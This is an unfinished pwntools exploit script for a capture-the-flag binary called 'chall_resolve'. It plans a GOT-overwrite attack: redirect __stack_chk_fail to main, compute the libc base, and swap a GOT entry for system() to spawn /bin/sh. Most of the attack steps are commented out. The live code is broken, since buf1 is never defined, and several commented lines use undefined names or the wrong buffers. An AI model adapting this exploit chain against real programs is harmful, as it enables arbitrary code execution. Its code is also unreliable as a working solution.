from pwn import *

bin_file = './chall_resolve'
context(os = 'linux', arch = 'amd64')

binf = ELF(bin_file)
addr_main = binf.functions['main'].address
addr_got_fgets = binf.got['fgets']
addr_got_scanf = binf.got['__isoc99_scanf']
addr_got_printf = binf.got['printf']
addr_got_stack_chk = binf.got['__stack_chk_fail']

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
offset_libc_fgets = libc.functions['fgets'].address

# def aar(conn, read_addr):
#     conn.sendlineafter(b'>> ', b'1')
#     conn.sendlineafter(b'read >> ', hex(read_addr))
#     conn.recvuntil(b' : ')
#     res = int(conn.recvuntil(b'\n'), 16)
#     return res

# def aaw(conn, written_addr, write_addr):
#     conn.sendlineafter(b'>> ', b'2')
#     conn.sendlineafter(b'write >> ', hex(written_addr))
#     conn.sendlineafter(b'value >> ', hex(write_addr))

def attack(conn):
    rop = ROP(binf)
    print(rop.ret)
    # round 1
    
    # buf1 = 
    conn.sendlineafter(b'>> ', buf1)

    # __stack_chk_fail() to ROP
    buf2 = addr_got_stack_chk
    conn.sendlineafter(b'>> ', hex(buf2))
    
    buf3 = addr_main
    conn.sendlineafter(b'>> ', hex(buf3))

    # # # round 2
    # buf4 = b'/bin/sh\x00'.ljust(28, b'\x00')
    # conn.sendlineafter(b'>> ', buf4)

    # # scanf() to printf()
    # buf5 = addr_got_scanf
    # print(hex(addr_got_scanf))
    # conn.sendlineafter(b'>> ', hex(buf5))

    # buf6 = addr_got_printf
    # conn.sendlineafter(b'>> ', hex(buf6))

    # # round 3
    # buf7 = b'/bin/sh\x00'.ljust(28, b'\x00')
    # conn.sendlineafter(b'>> ', buf7)

    # # fgets() to system()
    # buf8 = addr_got_scanf
    # conn.sendlineafter(b'>> ', hex(buf5))

    # buf9 = addr_got_printf
    # conn.sendlineafter(b'>> ', hex(buf6))
    
    # libc.address = addr_libc_fgets - offset_libc_fgets
    # info('addr_libc_base_addr = 0x{:08x}'.format(libc.address))    
    # addr_libc_system = libc.functions['system'].address
    # buf6 = addr_libc_system
    
    # libc.address = addr_libc_fgets - offset_libc_fgets
    # info('addr_libc_base_addr = 0x{:08x}'.format(libc.address))    
    # addr_libc_system = libc.functions['system'].address
    
    # aaw(conn, addr_got_exit, addr_main)    
    # addr_libc_atoi = aar(conn, addr_got_atoi)
    # libc.address = addr_libc_atoi - offset_libc_atoi
    # info('addr_libc_baseaddr = 0x{:08x}'.format(libc.address))
    # addr_libc_system = libc.functions['system'].address
    # aaw(conn, addr_got_atoi, addr_libc_system)
    # conn.sendline('/bin/sh')

def main():
    conn = process(bin_file)
    attack(conn)
    conn.interactive()

if __name__ == '__main__':
    main()

